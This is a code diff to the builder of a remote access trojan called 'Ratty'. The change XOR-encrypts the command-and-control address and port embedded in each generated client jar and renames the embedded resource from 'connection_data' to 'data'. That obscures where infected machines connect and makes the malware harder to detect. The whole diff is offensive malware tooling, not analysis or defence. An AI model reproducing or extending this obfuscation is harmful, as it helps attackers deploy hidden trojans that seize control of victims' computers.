@@ -48,6 +48,7 @@ import de.sogomn.rat.packet.WebsitePacket;
 import de.sogomn.rat.server.AbstractRattyController;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.util.FrameEncoder.IFrame;
+import de.sogomn.rat.util.XorCipher;
 
 /*
  * Woah, this is a huge class.
@@ -59,7 +60,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
-	private static final String BUILDER_REPLACEMENT = "connection_data";
+	private static final String BUILDER_REPLACEMENT = "data";
 	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
 	private static final String[] BUILDER_REMOVALS = {
 		"ping.wav",
@@ -401,6 +402,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 		
 		final String replacementString = String.format(BUILDER_REPLACEMENT_FORMAT, address, port);
 		final byte[] replacementData = replacementString.getBytes();
+		
+		XorCipher.crypt(replacementData);
 		
 		try {
 			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
